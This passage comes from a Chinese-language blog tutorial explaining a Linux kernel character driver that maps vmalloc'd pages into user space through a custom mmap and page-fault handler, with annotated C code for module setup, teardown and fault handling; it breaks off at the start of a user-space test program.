vm_fault_t (*fault)(struct vm_fault *vmf);只有一个参数</span></span><br><span class="line">    <span class="keyword">if</span> (likely(vma-&gt;vm_ops-&gt;fault)) &#123;</span><br><span class="line">        ret = vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (likely(pte_same(*page_table, orig_pte))) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 2. 通过物理内存页生成一个页表项值。</span></span><br><span class="line">        entry = mk_pte(page, vma-&gt;vm_page_prot);</span><br><span class="line">        <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)</span><br><span class="line">            entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 将虚拟内存地址映射到物理内存。</span></span><br><span class="line">        set_pte_at(mm, address, page_table, entry);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​函数主要通过调用虚拟内存管理区结构（vma）的 <code>fault()</code> 回调函数（也就是我们后面需要自定义的函数）来获取到文件的页缓存。并将虚拟内存地址映射到页缓存的物理内存页（也就是将进程的页表项设置为上面生成的页表项的值）。铺垫完这些前置知识后，接下来我们就一起来看看模块的代码具体实现。</p><h1 id="代码流程分析"><a href="#代码流程分析" class="headerlink" title="代码流程分析"></a>代码流程分析</h1><h3 id="map-driver-c"><a href="#map-driver-c" class="headerlink" title="map_driver.c"></a>map_driver.c</h3><p>​首先来看看内核驱动模块的源代码文件，该文件的函数可以分成三部分，第一部分是模块注册和退出函数，第二部分是 file_operations 函数指针，第三部分便是 vm_operations_struct 的函数指针，下面我们将依次进行分析。</p><p>​首先是第一部分模块注册和退出函数，宏定义方面，<code>MAP_PAGE_COUNT</code>为我们想创建的10个页面，每个页面的大小<code>PAGE_SIZE</code>的宏可在<code>linux/pages.h</code>下找到，<code>MAP_DEV_NAME</code> 为设备名，设备号我们采用动态分配。接下来的几个字段均和设备有关，定义于<code>linux/cdev.h</code>和<code>linux/divice.h</code>中。</p><p>​<code>struct file_operations</code>结构体定义在<code>linux/fs.h</code>下，它是 fs_struct 的一个成员，用来存放可对文件执行的函数操作指针，而<code>struct vm_operations_struct</code>在<code>linux/mm.h</code>下，它是 mm_struct 的一个成员，表示可对 vma 执行的函数操作指针。最后的<code>static char *vmalloc_area = NULL;</code>我们在后面会用到，用来记录分配的页面逻辑地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_PAGE_COUNT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_LEN (PAGE_SIZE * MAP_PAGE_COUNT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_DEV_NAME <span class="string">&quot;mmap_dirver_dev&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">dev_t</span> devid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">map_dev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">my_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">my_device</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct file_operations handler */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mapdrv_mmap</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> vm_area_struct *vma)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mapdrv_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct vm_operations_struct handler */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">map_vopen</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">map_vclose</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span>;</span><br><span class="line"><span class="type">vm_fault_t</span> <span class="title function_">map_fault</span><span class="params">(<span class="keyword">struct</span> vm_fault *vmf)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">mapdrvo_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .mmap = mapdrv_mmap,</span><br><span class="line">    .open = mapdrv_open,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> <span class="title">map_vm_ops</span> =</span> &#123;</span><br><span class="line">    .open = map_vopen,</span><br><span class="line">    .close = map_vclose,</span><br><span class="line">    .fault = map_fault,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *vmalloc_area = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);<span class="comment">// 证书</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;sqq&quot;</span>);<span class="comment">// 作者</span></span><br></pre></td></tr></table></figure><p>​模块加载函数需要完成两件事，其一为设备注册，我们使用动态申请设备号的注册方法，具体流程是 <code>register_chrdev_region()</code> 动态申请该设备号，<code>cdev_init()</code> 用于初始化 cedv 结构体，<code>cdev_add()</code> 用于添加一个字符设备到操作系统，<code>class_create()</code> 用于自动创建类和设备节点，这样我们就不必手动在 <code>/dev</code> 下创建设备文件了。这部分其实是一个单独的话题，设备驱动开发，因为我现在对其也不是特别了解，调试也花了不少时间，其中涉及到很多结构体关联，感兴趣可以自己去深入研究一下~</p><p>​其二为页面的申请，我们使用 <code>vmalloc()</code>函数进行页面的申请，然后在循环里，为每个物理页框<code>SetPageReserved()</code>置位，通过设置 Page 结构的 flag 成员变量，将 reserved 位置1，来将页框的属性设为占用，避免操作系统回收。而<code>struct page *vmalloc_to_page(const void *addr)</code>函数则是通过逻辑地址 addr 来寻找其物理页框的函数。为了方便观察，我们在每个页面内填充内容<code>&quot;Page%d initialize...&quot;</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mapdrv_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = alloc_chrdev_region(&amp;devid, <span class="number">0</span>, <span class="number">1</span>, MAP_DEV_NAME);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;alloc_chrdev_region is failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cdev_init(&amp;map_dev, &amp;mapdrvo_fops);</span><br><span class="line">    ret = cdev_add(&amp;map_dev, devid, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(devid, <span class="number">1</span>);</span><br><span class="line">        cdev_del(&amp;map_dev);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Add dev is failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    my_class = class_create(THIS_MODULE, MAP_DEV_NAME);</span><br><span class="line">    <span class="keyword">if</span> (!my_class)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(devid, <span class="number">1</span>);</span><br><span class="line">        cdev_del(&amp;map_dev);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;create calss failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    my_device = device_create(my_class, <span class="literal">NULL</span>, devid, <span class="literal">NULL</span>, MAP_DEV_NAME);</span><br><span class="line">    <span class="keyword">if</span> (!my_device)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;create device failed\n&quot;</span>);</span><br><span class="line">        unregister_chrdev_region(devid, <span class="number">1</span>);</span><br><span class="line">        cdev_del(&amp;map_dev);</span><br><span class="line">        class_destroy(my_class);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;chrdev[id:%d %d] register successfull!\n&quot;</span>, MAJOR(devid), MINOR(devid));</span><br><span class="line"></span><br><span class="line">    vmalloc_area = vmalloc(MAP_LEN);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> virt_addr = (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; virt_addr &lt; (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area + MAP_LEN; virt_addr += PAGE_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        SetPageReserved(vmalloc_to_page((<span class="type">void</span> *)virt_addr));</span><br><span class="line">        <span class="built_in">sprintf</span>((<span class="type">char</span> *)virt_addr, <span class="string">&quot;Page%d initialize...&quot;</span>, i++);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* printk(&quot;vmalloc_area at 0x%lx (phys 0x%lx)\n&quot;,</span></span><br><span class="line"><span class="comment">    (unsigned long)vmalloc_area,(unsigned long)vmalloc_to_pfn((void *)vmalloc_area) &lt;&lt; PAGE_SHIFT);  */</span></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;map_driver module init!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​模块退出函数与之相反，物理页面标记为可释放，并 vfree 掉虚拟地址，最后注销掉相关类和设备。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mapdrv_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* unreserve all pages */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> virt_addr = (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area; virt_addr &lt; (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area + MAP_LEN; virt_addr += PAGE_SIZE)</span><br><span class="line">        ClearPageReserved(vmalloc_to_page((<span class="type">void</span> *)virt_addr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vmalloc_area)</span><br><span class="line">        vfree(vmalloc_area);</span><br><span class="line"></span><br><span class="line">    unregister_chrdev_region(devid, <span class="number">1</span>);</span><br><span class="line">    cdev_del(&amp;map_dev);</span><br><span class="line">    device_del(my_device);</span><br><span class="line">    class_destroy(my_class);</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;delete device /sys/class/%s \n&quot;</span>,MAP_DEV_NAME);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;delete device /dev/%s\n&quot;</span>, MAP_DEV_NAME);</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;map_driver module exit!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​第二部分就是涉及到和 mmap() 函数相关的东西了，我们前面提到，在用户态的 mmap 函数进入到 mmap_region 函数里的这一句 <code>error = file-&gt;f_op-&gt;mmap(file, vma);</code>时，便是该进入我们 <code>struct file_operations mapdrvo_fops </code>结构体里自定义的 mmap 函数里执行了。接下来看看相关代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static struct file_operations mapdrvo_fops = &#123;</span></span><br><span class="line"><span class="comment">    .owner = THIS_MODULE,</span></span><br><span class="line"><span class="comment">    .mmap = mapdrv_mmap,</span></span><br><span class="line"><span class="comment">    .open = mapdrv_open,</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mapdrv_mmap</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> offset = vma-&gt;vm_pgoff &lt;&lt; PAGE_SHIFT;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size = vma-&gt;vm_end - vma-&gt;vm_start;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &gt; MAP_LEN)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Size too big\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENXIO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*  写进程的 vma 区域必须是可共享的 */</span></span><br><span class="line">    <span class="keyword">if</span> ((vma-&gt;vm_flags &amp; VM_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Writeable mappings can not be privated!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 锁住物理页框，防止被换出 */</span></span><br><span class="line">    vma-&gt;vm_flags |= VM_LOCKONFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 核心代码，设置对 mmap 区域的处理方法。</span></span><br><span class="line">        vma-&gt;vm_ops = &amp;map_vm_ops;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;offset out of range\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENXIO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​核心代码便是<code>vma-&gt;vm_ops = &amp;map_vm_ops;</code>，通过设置该域对 mmap 区域的处理方法，包括后续我们所说的缺页中断的处理函数，以方便进程在实际读写时调用该方法函数。对了，我们还定义了 open 函数，来看看吧，该函数主要就打印一下主调进程的信息方便记录一下日志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mapdrv_open</span><span class="params">(<span class="keyword">struct</span> inode *inoe, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;process[id: %d]: %s is mapping...\n&quot;</span>, current-&gt;pid, current-&gt;comm);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​接下来就是我们的第三部分，对应<code>struct vm_operations_struct map_vm_ops</code>里，我们完成了对虚拟内存的这三个操作的函数体实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;linux.mm.h&gt;  --这是内核源码中对 struct vm_operations_struct 的注释</span></span><br><span class="line"><span class="comment"> * These are the virtual MM functions - opening of an area, closing and</span></span><br><span class="line"><span class="comment"> * unmapping it (needed to keep files on disk up-to-date etc), pointer</span></span><br><span class="line"><span class="comment"> * to the functions called when a no-page or a wp-page exception occurs. </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>​首先来看看<code>vm_fault_t map_fault(struct vm_fault *vmf)</code>函数，其参数为<code>struct vm_fault</code>结构体，其定义于<code>linux/mm.h</code>，用于描述缺页相关页面参数。<code>struct vm_area_struct *vma;</code>就指向其所在线性映射区的 VAM，<code>unsigned long address;</code>即产生缺页的地址（注意：是进程空间中的逻辑地址），<code>*pmd, *pud, orig_pte </code>是一些页目录项和页表项，还有最重要的一项，就是<code>struct page *page;</code>，这就是需要建立的物理页框的结构体指针，需要指向对应页框的物理地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_fault</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span><span class="comment">/* Target VMA */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;<span class="comment">/* FAULT_FLAG_xxx flags */</span></span><br><span class="line"><span class="type">gfp_t</span> gfp_mask;<span class="comment">/* gfp mask to be used for allocations */</span></span><br><span class="line"><span class="type">pgoff_t</span> pgoff;<span class="comment">/* Logical page offset based on vma */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> address;<span class="comment">/* Faulting virtual address */</span></span><br><span class="line"><span class="type">pmd_t</span> *pmd;<span class="comment">/* Pointer to pmd entry matching</span></span><br><span class="line"><span class="comment"> * the &#x27;address&#x27; */</span></span><br><span class="line"><span class="type">pud_t</span> *pud;<span class="comment">/* Pointer to pud entry matching</span></span><br><span class="line"><span class="comment"> * the &#x27;address&#x27;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">pte_t</span> orig_pte;<span class="comment">/* Value of PTE at the time of fault */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">cow_page</span>;</span><span class="comment">/* Page handler may use for COW fault */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span><span class="comment">/* Cgroup cow_page belongs to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span><span class="comment">/* -&gt;fault handlers should return a</span></span><br><span class="line"><span class="comment"> * page here, unless VM_FAULT_NOPAGE</span></span><br><span class="line"><span class="comment"> * is set (which is also implied by</span></span><br><span class="line"><span class="comment"> * VM_FAULT_ERROR).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​下面来看看我们的<code>vm_fault_t map_fault(struct vm_fault *vmf)</code>函数的具体实现。</p><blockquote><p> 请注意该函数的目的是：将页在内核空间中的线性（逻辑）地址所对应的物理地址映射到进程用户空间的某线性（逻辑）地址中，而不是申请物理页框，物理页框在之前缺页流程中已经申请好了！请仔细揣摩一下这段话。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* page fault handler */</span></span><br><span class="line"><span class="type">vm_fault_t</span> <span class="title function_">map_fault</span><span class="params">(<span class="keyword">struct</span> vm_fault *vmf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> offset, kernel_virt_addr, phy_addr;</span><br><span class="line">    offset = vmf-&gt;address - vmf-&gt;vma-&gt;vm_start;</span><br><span class="line">    kernel_virt_addr = (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area + (<span class="type">unsigned</span> <span class="type">long</span>)(vmf-&gt;pgoff &lt;&lt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误检查</span></span><br><span class="line">    <span class="keyword">if</span> ((vmf-&gt;vma == <span class="literal">NULL</span>) || (vmalloc_area == <span class="literal">NULL</span>) || (offset &gt;= MAP_LEN))</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;return VM_FAULT_SIGBUS!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    phy_addr = (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_to_pfn((<span class="type">void</span> *)kernel_virt_addr) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">    page = vmalloc_to_page((<span class="type">void</span> *)kernel_virt_addr);</span><br><span class="line">    </span><br><span class="line">    get_page(page);</span><br><span class="line">    vmf-&gt;page = page;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;%s: map ker_virt_addr:0x%lx (phy_addr:0x%016lx) to usr_virt_addr:0x%lx , size: 0x%lx, page:%ld \n&quot;</span>,</span><br><span class="line">           __func__, kernel_virt_addr, phy_addr, vmf-&gt;address, PAGE_SIZE, vmf-&gt;pgoff);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>vmf-&gt;address，vmalloc_area，vmf-&gt;pgoff</code>：之前有提到，<code>vmf-&gt;address</code>表示该缺页在用户空间的逻辑地址。<code>vmalloc_area</code>是全局变量，在模块初始化函数里赋值的，表示页面在内核空间中的逻辑地址。<code>vmf-&gt;pgoff</code>则表示该缺页的编号，通常是0，1，2…。</li><li><code>unsigned long offset, kernel_virt_addr, phy_addr;</code>：<code>offset</code>字段表示该缺页与所在 VMA 起始地址的偏移，由于申请的页面大小为4096，因此该 <code>offset</code>的值通常是0，4096，8192…，<code>kernel_virt_addr</code>表示页在内核空间中的线性地址，<code>phy_addr</code>表示页框的物理地址。</li><li><code>phy_addr = (unsigned long)vmalloc_to_pfn((void *)kernel_virt_addr) &lt;&lt; PAGE_SHIFT;</code>：<code>vmalloc_to_pfn</code>函数可通过内核空间线性地址找到对应页的物理页框号并返回，而物理页框左移<code>PAGE_SHIFT</code>位便是我们要寻找的物理地址。</li><li><code>page = vmalloc_to_page((void *)kernel_virt_addr);</code>：该函数可通过内核空间线性地址返回对应页框的页描述符指针。</li><li><code>get_page(page);</code>：该函数用于该物理页框的引用计数 +1。</li><li><code>vmf-&gt;page = page;</code>：这个语句便是我们关键的动作了，将 vmf 结构体的 page 字段指向物理页框的描述符，便完成了映射过程。</li></ul><p>​最后，再来看看 open 和 close 的函数实现，这很简单啦，只是为了写个日志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* open handler for vm area */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">map_vopen</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;mapping vma is opened..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* close handler form vm area */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">map_vclose</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;mapping vma is closed..\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​到这里我们的故事终于就要结束了，太不容易了。</p><h3 id="maptest-read-c"><a href="#maptest-read-c" class="headerlink" title="maptest_read.c"></a>maptest_read.c</h3><p>​下面是我们用户空间的读程序。mmap 参数：可读，私有，加锁（防止被换出）。 mmap 返回的自然是用户空间的线性地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 